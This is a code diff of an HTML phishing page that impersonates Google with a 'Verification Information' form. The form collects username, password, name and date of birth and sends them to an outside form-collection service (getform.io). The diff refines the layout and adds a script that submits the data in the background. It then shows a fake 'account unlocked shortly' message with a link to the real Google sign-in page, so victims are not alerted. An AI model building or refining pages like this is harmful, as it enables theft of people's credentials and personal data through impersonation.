@@ -12,24 +12,51 @@
             padding: 0;
         }
         .container {
-            max-width: 300px;
+            max-width: 550px;
             margin: 50px auto;
             background: #fff;
-            padding: 100px;
+            padding: 20px;
             border-radius: 8px;
             box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
         h2 {
             color: #333;
+            font-size: 20px;
+            margin-bottom: 20px;
         }
-        input[type="text"], input[type="email"], input[type="passcode"], input[type="date"] {
-            width: 100%;
+        input[type="text"], input[type="email"], input[type="password"] {
+            width: 400px;
             padding: 10px;
-            margin: 10px 0;
+            margin: 5px 0;
             border: 1px solid #ccc;
             border-radius: 5px;
+            box-sizing: border-box;
         }
+
+        .date-of-birth-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 10px auto;
+            width: 400px;
+        }
+
+        .date-of-birth-container label {
+            margin: 0 0 5px;
+            font-size: 14px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .date-of-birth-container input[type="date"] {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            width: 100%;
+        }
+
         .submit-btn {
             background-color: #4285F4;
             color: white;
@@ -38,6 +65,7 @@
             cursor: pointer;
             font-size: 16px;
             border-radius: 5px;
+            margin-top: 20px;
         }
         .submit-btn:hover {
             background-color: #3071E7;
@@ -50,30 +78,93 @@
             font-size: 30px;
             font-weight: bold;
         }
-        .google-logo span:nth-child(1) { color: #4285F4; } /* Blue G */
-        .google-logo span:nth-child(2) { color: #DB4437; } /* Red o */
-        .google-logo span:nth-child(3) { color: #F4B400; } /* Yellow o */
-        .google-logo span:nth-child(4) { color: #4285F4; } /* Blue g */
-        .google-logo span:nth-child(5) { color: #0F9D58; } /* Green l */
-        .google-logo span:nth-child(6) { color: #DB4437; } /* Red e */
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #DB4437; }
+        .google-logo span:nth-child(3) { color: #F4B400; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #0F9D58; }
+        .google-logo span:nth-child(6) { color: #DB4437; }
+        .thank-you {
+            display: none;
+        }
+        .login-btn {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+        }
+        .login-btn:hover {
+            background-color: #3071E7;
+        }
+        .header {
+            font-size: 30px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .header .g { color: #4285F4; }
+        .header .o1 { color: #DB4437; }
+        .header .o2 { color: #F4B400; }
+        .header .g2 { color: #4285F4; }
+        .header .l { color: #0F9D58; }
+        .header .e { color: #DB4437; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="form-container">
         <div class="google-logo">
             <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
         </div>
         <h2>Verification Information</h2>
-        <form action="https://getform.io/f/aejrnqeb" method="POST">
+        <form id="verification-form" action="https://getform.io/f/aejrnqeb" method="POST">
             <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="passcode" placeholder="Password" required>
+            <input type="password" name="password" placeholder="Password" required>
             <input type="text" name="first_name" placeholder="First Name" required>
             <input type="text" name="last_name" placeholder="Last Name" required>
-            <label for="dob">Date of Birth:</label>
-            <input type="date" id="dob" name="dob" required>
-			<h2></h2>
+            <div class="date-of-birth-container">
+                <label for="dob">Date of Birth:</label>
+                <input type="date" id="dob" name="dob" required>
+            </div>
             <button type="submit" class="submit-btn">Submit</button>
         </form>
     </div>
+
+    <div class="container thank-you" id="thank-you-container">
+        <div class="header">
+            <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+        </div>
+        <h2>Thank you for verifying</h2>
+        <p>Your account should be unlocked shortly.</p>
+        <p>Please click this button to sign-in to your account.</p>
+        <a href="https://accounts.google.com" class="login-btn">Login</a>
+    </div>
+
+    <script>
+        document.getElementById("verification-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+            var form = this;
+            var formData = new FormData(form);
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("form-container").style.display = "none";
+                    document.getElementById("thank-you-container").style.display = "block";
+                } else {
+                    alert('There was an error submitting the form. Please try again.');
+                }
+            })
+            .catch(error => {
+                alert('There was an error submitting the form. Please try again.');
+            });
+        });
+    </script>
 </body>
 </html>
